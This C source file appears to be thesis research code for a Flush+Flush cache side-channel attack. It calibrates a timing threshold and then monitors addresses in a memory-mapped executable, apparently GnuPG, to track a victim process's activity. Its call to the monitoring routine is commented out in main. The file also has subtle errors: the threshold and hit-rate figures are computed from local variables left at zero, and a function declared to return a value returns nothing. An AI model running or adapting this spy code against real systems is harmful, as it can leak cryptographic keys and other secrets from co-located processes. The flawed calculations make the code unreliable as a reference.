#include "../../Utils/src/cachetechniques.h"
#include "../../Utils/src/flushspy.h"
#include "../../Utils/src/fileutils.h"

#define MAX_ADDRS_TO_MONITOR 10
#define MAX_TIMES_TO_MONITOR_EACH_ADDRS 300000

#define ANALYSIS_CSV_FILENAME "/home/root/thesis-code/flush_flush_static_analysis.csv"
#define VARIATION_ANALYSIS_DATA_DIRECTORY "/home/root/thesis-code/"
#define GPG_MAX_SIZE_BYTES 4194304
#define THRESHOLD 45
#define DELAYFORVICTIMACTIVITY 2800
#define MAXIDLECOUNT 500
#define OUTPUTRAWDATA 1

typedef struct evictiondata {
	unsigned int maxhit;
	unsigned int maxmiss;
	int threshold;
	double countcorrecthits;
	double allhits;
	double hitsrate;
	double countcorrectmisses;
	double allmisses;
	double evictionrate;
	unsigned int *hit_counts;
	unsigned int *miss_counts;
}evictiondata_t;

unsigned long obtainthreshold(int histogramsize, int histogramscale, evictiondata_t *evictiondata) {
	const int MAX_RUNS = 4 * 1024 * 1024;
	const int PAGES_SIZE = 4096;
	const int MID_ARRAY = PAGES_SIZE / 2;
	void *array;
	evictiondata->hit_counts = calloc(histogramsize, sizeof(unsigned int));
	evictiondata->miss_counts = calloc(histogramsize, sizeof(unsigned int));

	int i;
	array = mmap(0, PAGES_SIZE, PROT_READ | PROT_WRITE,
	MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	reload(array + MID_ARRAY);
	sched_yield();
	//4MB
	for (i = 0; i < MAX_RUNS; ++i) {
		reload(array + MID_ARRAY);
		unsigned long time = timeflush(array + MID_ARRAY) / histogramscale;
		evictiondata->hit_counts[time > (histogramsize - 1) ? histogramsize - 1 : time]++;
		sched_yield();
	}

	for (i = 0; i < MAX_RUNS; ++i) {
		unsigned long time = flushandflush(array + MID_ARRAY) / histogramscale;
		evictiondata->miss_counts[time > (histogramsize - 1) ? histogramsize - 1 : time]++;
		sched_yield();
	}

	unsigned int hitmax = 0;
	unsigned int missmax = 0;
	unsigned int hitmaxindex = 0;
	unsigned int missmaxindex = 0;
	unsigned int missminindex = 0;
	printf("TSC:           HITS           MISSES\n");
	for (i = 0; i < histogramsize; ++i) {
		printf("%3d: %10zu %10zu\n", i * histogramscale, evictiondata->hit_counts[i],
				evictiondata->miss_counts[i]);
		if (hitmax < evictiondata->hit_counts[i]) {
			hitmax = evictiondata->hit_counts[i];
			hitmaxindex = i;
		}
		if (missmax < evictiondata->miss_counts[i]) {
			missmax = evictiondata->miss_counts[i];
			missmaxindex = i;
		}
		if (evictiondata->miss_counts[i] > 3 && missminindex == 0)
			missminindex = i;
	}
	double countcorrectmisses = 0, allmisses = 0, countcorrecthits = 0, allhits = 0;
	int maxhit = 0, maxmiss = 0, threshold = 0;
	evictiondata->maxhit = hitmaxindex * histogramscale;
	evictiondata->maxmiss = missmaxindex * histogramscale;
	evictiondata->threshold = maxmiss - (maxmiss - maxhit) / 2;

	for (i = 0; i < histogramsize; ++i) {
		if (evictiondata->miss_counts[i] > 0 && (i * histogramscale) > threshold) {
			++countcorrectmisses;
		}
		if (evictiondata->miss_counts[i] > 0) {
			++allmisses;
		}
		if (evictiondata->hit_counts[i] > 0 && (i * histogramscale) < threshold) {
			++countcorrecthits;
		}
		if (evictiondata->hit_counts[i] > 0) {
			++allhits;
		}
	}

	evictiondata->countcorrecthits = countcorrecthits;
	evictiondata->countcorrectmisses = countcorrectmisses;
	evictiondata->allhits = allhits;
	evictiondata->allmisses = allmisses;
	evictiondata->evictionrate = (countcorrectmisses / allmisses) * 100;
	evictiondata->hitsrate = (countcorrecthits / allhits) * 100;

	printf("\nMax Hit: %u\n", evictiondata->maxhit);
	printf("\nMax Miss: %u\n", evictiondata->maxmiss);
	printf("\nThreshold: %u\n", evictiondata->threshold);
	printf("\nHits Rate: %lf\%\n", evictiondata->hitsrate);
	printf("\nEviction Rate: %lf\%\n", evictiondata->evictionrate);

}

int analysecache(int delay, long int exe_addrs[MAX_ADDRS_TO_MONITOR],
		int nr_addrs,
		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs]) {
	int fd_exe;
	struct stat sbuff;
	char* mapping_addr;

	//share the executable
	fd_exe = open(EXE_FILENAME, O_RDONLY);
	if (fd_exe == -1)
		handle_error("open_exe_filename");
	if (fstat(fd_exe, &sbuff) == -1)
		handle_error("fstat");
	mapping_addr = (char*) mmap(0, GPG_MAX_SIZE_BYTES, PROT_READ, MAP_PRIVATE,
			fd_exe, 0);
	if (mapping_addr == MAP_FAILED)
		handle_error("mmap");
	printf(".exe shared\n");

	unsigned long ptr_offset = (unsigned long) mapping_addr;

	//monitor .exe addrs
	printf(".exe addrs monitor\n");

	//Begin NEW
	unsigned long long start = getcurrenttsc();
	ff_analysealladdrs(OUTPUTRAWDATA, analysis_array[0], ptr_offset, exe_addrs,
			nr_addrs,
			THRESHOLD);
	do {
		do {
			start += delay;
		} while (missedvictimactivity(start));
		ff_analysealladdrs(OUTPUTRAWDATA, analysis_array[0], ptr_offset, exe_addrs,
				nr_addrs,
				THRESHOLD);
	} while (!isvictimactive(analysis_array[0], nr_addrs,
	OUTPUTRAWDATA ? THRESHOLD : 2));

	int idle = 0, i = 1, missedactivity = 0, missrate = 0;

	for (i = 1, idle = 0;
			idle < MAXIDLECOUNT && i < MAX_TIMES_TO_MONITOR_EACH_ADDRS;
			++idle, ++i) {
		if (!missedactivity) {
			ff_analysealladdrs(OUTPUTRAWDATA, analysis_array[i], ptr_offset,
					exe_addrs, nr_addrs,
					THRESHOLD);
			if (isvictimactive(analysis_array[i], nr_addrs,
			OUTPUTRAWDATA ? THRESHOLD : 2))
				idle = 0;
		} else {
			missedalladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs);
			++missrate;
		}

		start += delay;
		missedactivity = missedvictimactivity(start);

	}
	printf(".exe results to csv file\n");
	printf("Missed samples: %d\n", missrate);
	printf("Samples: %d\n", i);
	munmap(mapping_addr, sbuff.st_size);
	close(fd_exe);
	return i;
}

int main() {
	//Obtain threshold
	evictiondata_t *evictiondata = calloc(1, sizeof(evictiondata_t));
	const int histogramscale = 5;
	const int histogramsize = 300;
	obtainthreshold(histogramsize, histogramscale,evictiondata);
	printf("THRESHOLD ::: %d\n\r", evictiondata->threshold);


	const char *prefix = "LLC";
	char *dirwithprefix = concat(VARIATION_ANALYSIS_DATA_DIRECTORY, prefix);
	char *dstfilename = concat(dirwithprefix, "_flush_flush_histogram.data");
	twoarraystocsvwithstrheaders(dstfilename, "Reload+Flush(Hit)",
			"Flush+Flush(Miss)", histogramscale, histogramsize,
			evictiondata->hit_counts, evictiondata->miss_counts);


//	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
//	int nr_addrs;
//
//	//obtain the addrs to monitor
//	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
//
//	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];
//
//	//analyse LLC
//	int analysis_array_length = analysecache(DELAYFORVICTIMACTIVITY, exe_addrs,
//			nr_addrs, analysis_array);
//
//	//results to csv file
//	biarraytocsvwithhexheaders(ANALYSIS_CSV_FILENAME, exe_addrs,
//			analysis_array_length, nr_addrs, analysis_array);

	return 0;
}
